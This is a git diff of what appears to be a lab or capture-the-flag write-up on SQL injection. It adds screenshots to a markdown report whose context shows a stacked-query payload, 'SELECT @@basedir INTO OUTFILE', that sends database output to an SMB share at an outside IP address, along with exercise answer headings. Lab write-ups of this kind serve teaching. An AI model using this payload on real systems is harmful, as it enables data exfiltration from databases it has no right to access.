@@ -51,6 +51,9 @@ The use of `multi_query()` also indicated that the application could process m
 
 Therefore, the `visitor_name` parameter was tested for SQL injection.
 
+<img width="1280" height="724" alt="Screenshot 2026-08-28 at 5 43 28 AM" src="https://github.com/user-attachments/assets/fba328e4-4c35-40fa-8b1a-b98402e23aba" />
+
+
 ---
 
 ## 4. Exploitation Methodology
@@ -89,6 +92,9 @@ ls
 
 The SQL injection payload was then used to make the database write the requested information to the SMB share.
 
+<img width="1111" height="713" alt="Screenshot 2026-08-28 at 6 04 49 AM" src="https://github.com/user-attachments/assets/298a637b-6cd3-445b-87b1-fdee11f1358e" />
+
+
 ---
 
 ## 5. Payload
@@ -112,6 +118,10 @@ The payload works by:
 
 The payload was supplied through the `visitor_name` parameter.
 
+
+<img width="1279" height="728" alt="Screenshot 2026-08-28 at 5 54 42 AM" src="https://github.com/user-attachments/assets/2cd07a68-2df7-4a33-8316-9a0288c21c35" />
+
+
 After executing the request, the file was checked using:
 
 ```bash
@@ -123,6 +133,9 @@ Then:
 ```bash
 cat /tmp/out.txt
 ```
+
+<img width="1097" height="649" alt="Screenshot 2026-08-28 at 5 54 25 AM" src="https://github.com/user-attachments/assets/e2e7ca9c-b777-4b63-981c-4a4918d776fb" />
+
 
 ### Question 1 Answer
 
@@ -142,11 +155,17 @@ Payload:
 1'; SELECT @@basedir INTO OUTFILE '\\\\192.168.189.227\\logs\\out.txt'; --
 ```
 
+<img width="1278" height="726" alt="Screenshot 2026-08-28 at 6 38 54 AM" src="https://github.com/user-attachments/assets/689e6ec4-0979-4cea-a7d1-dff65708d084" />
+
+
 After executing the request, the output file was read using:
 
 ```bash
 cat /tmp/out.txt
 ```
+<img width="1078" height="579" alt="Screenshot 2026-08-28 at 6 13 23 AM" src="https://github.com/user-attachments/assets/bf1123f4-300d-4080-8cde-40418c1b0f38" />
+
+
 
 ### Question 2 Answer
 
